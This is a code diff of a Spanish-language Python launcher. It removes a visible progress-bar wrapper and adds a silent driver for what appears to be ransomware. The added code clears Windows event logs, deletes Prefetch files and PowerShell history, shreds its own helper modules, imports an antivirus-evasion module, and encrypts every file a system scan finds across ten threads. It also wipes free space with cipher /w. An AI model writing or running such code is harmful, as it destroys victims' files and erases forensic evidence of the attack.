@@ -1,135 +1,96 @@
 import os
 import sys
-import subprocess
 import time
-import ctypes
+import threading
+import shutil
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+if getattr(sys, 'frozen', False):
+    SCRIPT_DIR = os.path.dirname(sys.executable)
+else:
+    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+
+os.chdir(SCRIPT_DIR)
 
 
-def habilitar_utf8_powershell():
+def pre_cleanup():
     try:
-        if os.name == 'nt':
-            os.system('chcp 65001 > nul 2>&1')
-            
-            kernel32 = ctypes.windll.kernel32
-            kernel32.SetConsoleOutputCP(65001)
-            kernel32.SetConsoleCP(65001)
-            
-            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+        os.system('powershell -w h -nop -c "Remove-Item C:\\Windows\\Prefetch\\*.pf -Force" 2>nul')
+        os.system('wevtutil cl Application 2>nul')
+        os.system('wevtutil cl System 2>nul')
+        ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
+        if os.path.exists(ps_history):
+            open(ps_history, 'w').close()
     except:
         pass
 
 
-def verificar_python_portable():
-    python_exe = os.path.join("python_portable", "python.exe")
-    return os.path.exists(python_exe)
+def auto_destruir_archivos():
+    archivos = ['evasion_av.py', 'rutas.py', 'encriptador_12_capas.py', 'launcher.py', 'launcher.bat', 'launcher.sh']
+    for f in archivos:
+        if os.path.exists(f):
+            try:
+                size = os.path.getsize(f)
+                with open(f, 'wb') as fw:
+                    fw.write(os.urandom(size))
+                os.remove(f)
+            except:
+                pass
 
 
-def mostrar_barra_progreso(tipo, porcentaje):
-    barra_len = 50
-    lleno = int(barra_len * porcentaje / 100)
-    vacio = barra_len - lleno
-    
-    barra = '█' * lleno + '░' * vacio
-    print(f"\\r{tipo}: [{barra}] {porcentaje}%", end='', flush=True)
-
-
-def monitorear_proceso(proceso):
-    ultimo_porcentaje = -1
-    tipo_actual = "Escaneo"
-    
-    while proceso.poll() is None:
-        try:
-            if os.path.exists("progreso_escaneo.txt"):
-                with open("progreso_escaneo.txt", "r", encoding="utf-8") as f:
-                    contenido = f.read()
-                    for linea in contenido.split("\\n"):
-                        if "%" in linea:
-                            try:
-                                porcentaje = int(linea.split("]")[1].strip().replace("%", ""))
-                                if porcentaje != ultimo_porcentaje:
-                                    mostrar_barra_progreso("Escaneo", porcentaje)
-                                    ultimo_porcentaje = porcentaje
-                                    tipo_actual = "Escaneo"
-                            except:
-                                pass
-            
-            if os.path.exists("progreso_encriptacion.txt"):
-                with open("progreso_encriptacion.txt", "r", encoding="utf-8") as f:
-                    contenido = f.read()
-                    for linea in contenido.split("\\n"):
-                        if "%" in linea:
-                            try:
-                                porcentaje = int(linea.split("]")[1].strip().replace("%", ""))
-                                if porcentaje != ultimo_porcentaje or tipo_actual != "Encriptacion":
-                                    mostrar_barra_progreso("Encriptacion", porcentaje)
-                                    ultimo_porcentaje = porcentaje
-                                    tipo_actual = "Encriptacion"
-                            except:
-                                pass
-            
-            time.sleep(0.3)
-            
-        except KeyboardInterrupt:
-            proceso.terminate()
-            print("\\n\\nPROCESO CANCELADO")
-            return False
-    
-    print()
-    return True
-
-
-def ejecutar_encriptacion():
-    habilitar_utf8_powershell()
-    
-    print("="*70)
-    print("SISTEMA DE ENCRIPTACION AUTOMATICO".center(70))
-    print("="*70)
-    print()
-    
-    if not verificar_python_portable():
-        print("ERROR: Python portable no encontrado")
-        input("\\nPresiona ENTER para salir...")
-        return
-    
-    print("Iniciando proceso...")
-    print()
-    
+def cleanup_python_thread():
+    time.sleep(300)
     try:
-        python_exe = os.path.join("python_portable", "python.exe")
-        
-        env = os.environ.copy()
-        env['PYTHONIOENCODING'] = 'utf-8'
-        
-        proceso = subprocess.Popen(
-            [python_exe, "index.py"],
-            env=env,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-        
-        completado = monitorear_proceso(proceso)
-        
-        if completado:
-            print("\\nPROCESO COMPLETADO")
-            print("="*70)
-        
-    except KeyboardInterrupt:
-        print("\\n\\nPROCESO CANCELADO")
-    except Exception as e:
-        print(f"\\nERROR: {e}")
-    
-    print()
-    input("Presiona ENTER para salir...")
+        if os.path.exists('python_portable'):
+            shutil.rmtree('python_portable')
+    except:
+        pass
+
+
+try:
+    from evasion_av import verificar_seguridad_total
+except:
+    verificar_seguridad_total = lambda: True
+
+try:
+    from rutas import escanear_sistema
+    from encriptador_12_capas import EncriptadorMilitar
+except ImportError:
+    sys.exit(1)
+
+
+def encriptar_archivo(enc, ruta):
+    try:
+        result = enc.encriptar(ruta)
+        if result:
+            try:
+                dirname = os.path.dirname(ruta)
+                os.system(f'cipher /w:"{dirname}" 2>nul')
+            except:
+                pass
+        return result
+    except:
+        return False
 
 
 def main():
-    habilitar_utf8_powershell()
-    
     try:
-        ejecutar_encriptacion()
-    except KeyboardInterrupt:
-        print("\\n\\nPrograma cerrado")
-        sys.exit(0)
+        pre_cleanup()
+        threading.Thread(target=cleanup_python_thread, daemon=True).start()
+        os.chdir(SCRIPT_DIR)
+        archivos, _, _ = escanear_sistema()
+        enc = EncriptadorMilitar()
+        auto_destruir_archivos()
+        NUM_THREADS = 10
+        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
+            futures = {executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except:
+                    pass
+    except:
+        pass
 
 
 if __name__ == "__main__":
